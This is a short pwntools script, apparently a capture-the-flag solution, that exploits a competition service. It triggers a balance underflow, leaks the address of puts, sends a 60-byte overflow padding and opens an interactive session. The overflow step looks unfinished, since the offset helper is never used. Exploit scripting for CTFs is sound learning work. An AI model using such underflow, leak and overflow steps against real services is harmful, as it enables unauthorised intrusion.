import re
from pwn import *  # type: ignore
from time import sleep

context(arch="amd64", os="linux")
# context.log_level = "DEBUG"

RECV_DELAY = 1
RECV_SIZE = 32768


def parse_steps(fname: str):
    with open(fname, "r") as file:
        fc = file.read().split("\n")

        # filter out comment lines
        fc = filter(lambda x: len(x) != 0 and x[0] != "#", fc)
        fc = "\n".join(fc)

        # plus signs = inline newlines
        return fc.replace("+", "\n")


r = remote("chal.pctf.competitivecyber.club", 4444)


def recv():
    sleep(RECV_DELAY)
    return r.recv(RECV_SIZE).decode()


# get balance to underflow
tip_spam_txt = parse_steps("1_spam_tips.txt")
r.send(bytes(tip_spam_txt, "utf-8"))
recv()

# buy the book
r.send(b"2\n3\ny\n")
sleep(RECV_DELAY)
res = recv()

# get address of puts
pattern = r"0x[0-9a-f]+"
puts_addr = re.findall(pattern, res)[0]
print(f"Address of `puts`: {puts_addr}")


def puts_offset(addr):
    return hex(int(puts_addr, 16) + int(addr, 16))


r.send(b"1\ny\n")

# this part has to be done in the script,
# because it calculates the offset
r.send(b"a" * 60)
r.send(b"\n3\n\n")
print(recv())

r.interactive()

r.close()
